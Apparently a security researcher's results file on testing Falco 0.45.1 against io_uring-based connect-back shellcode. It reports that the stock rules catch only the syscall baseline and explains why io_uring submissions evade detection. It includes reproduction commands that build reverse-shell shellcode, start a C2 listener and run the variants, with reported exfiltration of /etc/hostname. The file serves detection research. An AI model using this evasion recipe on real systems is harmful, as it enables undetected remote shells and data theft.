# Falco vs io_uring — captured evidence & takeaways

> **Provenance note (2026-10-24):** this file is a reconstruction. The original
> capture was deleted when `make clean` ran `rm -f results/*.md` (a Makefile
> bug, now fixed to remove only the generated `edr_matrix.md`). Rebuilt from
> the surviving sources: `results/falco_demo.cast` (raw session recording),
> `testing/falco_setup.md` (companion how-to) and `paper/writeup.md` §5.2–5.3.
> Raw falco rows below are pane-truncated at 190 columns; the full session is
> playable via `uvx asciinema play results/falco_demo.cast`.

**Author:** Maycon Vitali (@maycon) — Hack N' Roll
**Research:** Syscall-less shellcode via io_uring

## Environment

| Component | Version |
|---|---|
| falco | 0.45.1 (`falcosecurity/falco:0.45.1-debian`) |
| Engine | `modern_ebpf` (probe attached ~5–15 s after start) |
| Ruleset | shipped defaults only (no `-r`) |
| Kernel | 6.14.0 |
| Layout | falco container (privileged, `--network host`), C2 listener + `testing/runner` on host |

## Results — default ruleset

Three runs, one session (see `falco_demo.cast`):

| Variant | Stock-rule rows | What fired |
|---|:---:|---|
| `cbsys.bin` — pure-syscall baseline | **3** | `Redirect stdout/stdin to network connection` — one per `dup2`, with full 4-tuple |
| `cb_uring.bin` — io_uring classic | **0** | fd untracked; native `dup2` visible but carries no net info → rule cannot match |
| `cbr_uring.bin` — io_uring zero-exec | **0** | silent end-to-end |

Whole-session total: **exactly 3 Notices — all from the baseline**. No default
rule fired on `io_uring_setup` / `io_uring_enter` themselves.

### Captured rows (from the cast, pane-truncated)

```text
Notice Redirect stdout/stdin to network connection | gparent=<NA> ggparent=<NA> gggpare…
Notice Redirect stdout/stdin to network connection | gparent=<NA> ggparent=<NA> gggpare…
Notice Redirect stdout/stdin to network connection | gparent=<NA> ggparent=<NA> gggpare…
```

Counter stays at 3 across SCENARIO 2 (`cb_uring`) and SCENARIO 3 (`cbr_uring`),
while the C2 pane confirms both variants fully succeeded — including the
`/etc/hostname` exfil (`codeforge`) with a clean, execve-free exit
(`DEMO_OK present: True`).

## With the custom ruleset (`testing/falco_reverse_sh_poc.yaml`)

Adding `POC_REVSHELL` widens the picture to a full chain view:

- The `dup2` rows are present for the uring classic variant too — but without
  fd↔socket association they carry no network tuple.
- The stock reverse-shell rule requires `fd.type in ("ipv4","ipv6")`, which
  falco derives from the `socket()` **syscall**. A socket created via
  `IORING_OP_SOCKET`/`IORING_OP_CONNECT` (submitted through
  `io_uring_enter`) never gets that association.
- Key rules on `proc.name`/pid, not `proc.exepath`: falco normalizes
  `execve("/bin//sh")` to `exepath=/usr/bin/dash`.
- Even with io_uring event types (falco ≥ 0.38), rules can only see "this
  process created a ring" — operand context (file paths, peers) lives inside
  the submission, not in the syscall arguments.

## Takeaways

1. Default falco 0.45.1 is **completely blind** to io_uring-submitted I/O; only
   the legacy syscall phases of a *pure-syscall* baseline trip stock rules.
2. Detection at the `sys_enter` boundary is structurally limited to
   `io_uring_setup`/`io_uring_enter` presence, never operands.
3. The correct detection point is the LSM layer (`security_file_open`,
   `security_socket_connect`) — called from inside VFS/network stack
   regardless of the submission path (see writeup §5.4).

## Reproduction

All-in-one (falco starts first, target runs inside the falco container):

```bash
# blobs + static runner
mkdir -p /tmp/poc
nasm -f bin -o /tmp/poc/cbsys.bin  shellcode/connect_back_sys.asm
python3 builder/uring_builder.py builder/missions/connect_back.yaml      \
    --out /tmp/poc/cb_uring.bin --quiet
python3 builder/uring_builder.py builder/missions/connect_back_recv.yaml \
    --out /tmp/poc/cbr_uring.bin --quiet
gcc -O0 -static -o /tmp/poc/runner testing/runner.c

# listener (host)
python3 testing/c2_server.py --host 0.0.0.0 --port 4444 &

# falco (defaults only) — wait ~15 s for the probe
docker run -d --name flk --privileged --network host -e HOST_ROOT=/host \
  -v /tmp/poc:/lab:ro -v /proc:/host/proc:ro -v /sys:/host/sys:ro \
  -v /etc:/host/etc:ro \
  falcosecurity/falco:0.45.1-debian \
  falco -c /etc/falco/falco.yaml -o webserver.enabled=false
sleep 15

# fire each variant
docker exec flk /lab/runner /lab/cbsys.bin     # baseline → 3 rows
docker exec flk /lab/runner /lab/cb_uring.bin  # uring    → 0 rows
docker exec flk /lab/runner /lab/cbr_uring.bin # zero-exec → silent

# read
docker logs flk 2>&1 | grep "Redirect stdout/stdin"
```

Two-terminal / custom-ruleset / troubleshooting variants: see
`testing/falco_setup.md` (Layouts A and B) and `testing/run_falco_poc.sh`.
